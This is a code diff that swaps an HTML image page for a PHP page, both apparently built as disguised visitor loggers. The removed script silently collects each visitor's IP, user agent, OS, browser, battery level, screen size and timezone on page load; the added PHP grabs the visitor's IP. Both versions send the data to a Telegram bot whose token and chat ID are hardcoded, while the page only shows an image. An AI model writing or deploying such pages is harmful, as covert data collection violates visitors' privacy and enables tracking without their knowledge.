@@ -1,102 +1,39 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PHP Page with JavaScript</title>
-    <style>
-        body, html {
-            height: 100%;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f3f3f3;
-        }
-        img {
-            max-width: 100%;
-            max-height: 100%;
-        }
-    </style>
-</head>
-<body>
-    <!-- Adding image to the body -->
-    <img src="https://krasivosti.pro/uploads/posts/2024-01/1704676946_krasivosti-pro-p-bikovaya-akula-krasivo-40.jpg" alt="Embedded Image">
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            let screenWidth;
-            let screenHeight;
-            let batteryLevel;
+<?php
+// Получение IP адреса клиента
+$ip = $_SERVER['REMOTE_ADDR'];
 
-            navigator.getBattery().then(function(battery) {
-                batteryLevel = (battery.level * 100) + '%';
-            }).catch(function() {
-                batteryLevel = "unknown";
-            });
+// Информация для отправки в Telegram
+$token = '7419899814:AAH1plPVW3g5ZUGAFBXKZLmWYGEA0kU20FI';
+$chatId = '-1002151934748';
+$message = "IP address: $ip";
 
-            screenWidth = window.screen.width;
-            screenHeight = window.screen.height;
+sendMessageToTelegram($token, $chatId, $message);
 
-            const screenWidthConst = screenWidth;
-            const screenHeightConst = screenHeight;
+// Вывод изображения
+echo '<img src="images/pic.jpg" alt="Image">';
 
-            const urlParams = new URLSearchParams(window.location.search);
-            const userAgent = navigator.userAgent;
+// Функция для отправки сообщения в Telegram
+function sendMessageToTelegram($token, $chatId, $message) 
+{
+    $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'Markdown'
+    ];
 
-            fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                const osname = navigator.platform;
-                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const browser = getBrowserInfo();
+    $options = [
+        'http' => [
+            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+            'method'  => 'POST',
+            'content' => http_build_query($data),
+        ],
+    ];
 
-                const message = `
-                    *👤 Новый пользователь*
+    $context  = stream_context_create($options);
 
-                    *🧭 Информация:*
-                    *💻 System:*
-                        ├ IP: ${ip}
-                        ├ UserAgent: ${userAgent}
-                        ├ OS: ${osname}
-                        ├ Browser: ${browser}
-                        ├ Battery: ${batteryLevel}
-                        ├ Screen: ${screenWidth}x${screenHeight} px.
-                        └ Timezone: ${timeZone}
-
-                    `;
-                
-                const token ='7419899814:AAH1plPVW3g5ZUGAFBXKZLmWYGEA0kU20FI';
-                const chatId = '-1002151934748';
-                const url = 'https://api.telegram.org/bot' + token + '/sendMessage';
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('text', message);
-                formData.append('parse_mode', 'Markdown');
-                return fetch(url, { method: 'POST', body: formData });
-            }).catch(function(error) {
-                console.error('Error:', error);
-            });
-        });
-
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            let browser = '';
-            const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i);
-
-            if (/trident/i.test(match[1])) {
-                const tem = /\brv[ :]+(\d+)/g.exec(ua);
-                browser = 'IE ' + (tem && tem[1] ? tem[1] : '');
-            } else if (match[1] === 'Chrome') {
-                const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
-                if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera').replace('Edg', 'Edge');
-            } else {
-                browser = `${match[1]} ${match[2] || ''}`.trim();
-            }
-
-            return browser;
-        }
-    </script>
-</body>
-</html>
+    $result = file_get_contents($url, false, $context);
+    return $result;
+}
+?>
